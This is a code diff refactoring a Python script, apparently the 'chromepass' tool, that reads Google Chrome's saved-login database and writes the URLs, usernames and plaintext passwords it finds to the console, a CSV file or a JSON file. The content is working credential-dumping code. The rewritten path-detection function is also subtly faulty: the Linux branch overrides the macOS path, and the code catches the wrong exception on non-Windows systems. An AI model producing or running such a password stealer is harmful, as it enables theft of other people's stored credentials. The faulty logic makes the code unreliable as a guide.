@@ -6,19 +6,63 @@ import sqlite3
 import csv
 import json
 import argparse
+from contextlib import contextmanager
 
 try:
     import win32crypt
 except:
     pass
 
+OUTPUT_FILENAME = 'chromepass-passwords'
+
+
+class OutputFile(object):
+
+    def __init__(self, _type):
+        self.type = _type
+
+    def open(self):
+        return self.type.open_file()
+
+    def write(self, file, content):
+        self.type.write_into_file(file, content)
+
+
+class CSV(object):
+    FILENAME = '{}.csv'.format(OUTPUT_FILENAME)
+
+    @contextmanager
+    def open_file(self):
+        fp = open(CSV.FILENAME, 'wb')
+        yield fp
+        fp.close()
+        print("Data written to {}".format(CSV.FILENAME))
+
+    def write_into_file(self, _file, content):
+        _file.write('origin_url,username,password \n'.encode('utf-8'))
+        for data in content:
+            _file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))
+
+
+class JSON(object):
+    FILENAME = '{}.json'.format(OUTPUT_FILENAME)
+
+    @contextmanager
+    def open_file(self):
+        fp = open(JSON.FILENAME, 'w')
+        yield fp
+        fp.close()
+        print("Data written to {}".format(JSON.FILENAME))
+
+    def write_into_file(self, _file, content):
+        json.dump({'password_items': content}, _file)
 
 
 def args_parser():
 
     output_mapping = {
-        'csv': output_csv,
-        'json': output_json
+        'csv': CSV(),
+        'json': JSON()
     }
 
     parser = argparse.ArgumentParser(description="Retrieve Google Chrome Passwords")
@@ -29,13 +73,15 @@ def args_parser():
     if args.dump:
         for data in main():
             print(data)
-    try:
-        output_mapping[args.output](main())
-        return
+    else:
+        info = main()
+        try:
+            output(info, output_mapping[args.output])
+            return
 
-    except KeyError as e:
-        print(repr(e))
-        parser.print_help()
+        except Exception as e:
+            print(repr(e))
+            parser.print_help()
 
 def main():
     info_list = []
@@ -72,13 +118,13 @@ def main():
 
     except sqlite3.OperationalError as e:
         e = str(e)
-        if (e == 'database is locked'):
+        if e == 'database is locked':
             print('[!] Make sure Google Chrome is not running in the background')
             sys.exit(0)
-        elif (e == 'no such table: logins'):
+        elif e == 'no such table: logins':
             print('[!] Something wrong with the database name')
             sys.exit(0)
-        elif (e == 'unable to open database file'):
+        elif e == 'unable to open database file':
             print('[!] Something wrong with the database path')
             sys.exit(0)
         else:
@@ -89,51 +135,36 @@ def main():
 
 
 def getpath():
-    if os.name == "nt":
-        # This is the Windows Path
-        PathName = os.getenv('localappdata') + \
-            '\\Google\\Chrome\\User Data\\Default\\'
-        if (os.path.isdir(PathName) == False):
-            print('[!] Chrome Doesn\'t exists')
-            sys.exit(0)
-    elif ((os.name == "posix") and (sys.platform == "darwin")):
-        # This is the OS X Path
-        PathName = os.getenv(
-            'HOME') + "/Library/Application Support/Google/Chrome/Default/"
-        if (os.path.isdir(PathName) == False):
-            print('[!] Chrome Doesn\'t exists')
-            sys.exit(0)
-    elif (os.name == "posix"):
-        # This is the Linux Path
-        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
-        if (os.path.isdir(PathName) == False):
-            print('[!] Chrome Doesn\'t exists')
-            sys.exit(0)
-
-    return PathName
-
-
-def output_csv(info):
     try:
-        with open('chromepass-passwords.csv', 'wb') as csv_file:
-            csv_file.write('origin_url,username,password \n'.encode('utf-8'))
-            for data in info:
-                csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data[
-                    'username'], data['password'])).encode('utf-8'))
-        print("Data written to chromepass-passwords.csv")
+        # This is the Windows Path - assuming user running Windows
+        path_name = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
+    except OSError as e:
+        print(repr(e))
+        path_name = ''
+
+    if (os.name == "posix") and (sys.platform == "darwin"):
+        # This is the OS X Path
+        path_name = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
+    if os.name == "posix":
+        # This is the Linux Path
+        path_name = os.getenv('HOME') + '/.config/google-chrome/Default/'
+
+    if not os.path.isdir(path_name):
+        print('[!] Chrome Doesn\'t exists')
+        sys.exit(0)
+
+    return path_name
+
+
+def output(info, output_type):
+    output_class = OutputFile(output_type)
+    try:
+        with output_class.open() as fp:
+            output_class.write(fp, info)
     except EnvironmentError:
         print('EnvironmentError: cannot write data')
 
 
-def output_json(info):
-	try:
-		with open('chromepass-passwords.json', 'w') as json_file:
-			json.dump({'password_items':info},json_file)
-			print("Data written to chromepass-passwords.json")
-	except EnvironmentError:
-		print('EnvironmentError: cannot write data')
-
-
-
 if __name__ == '__main__':
     args_parser()
+
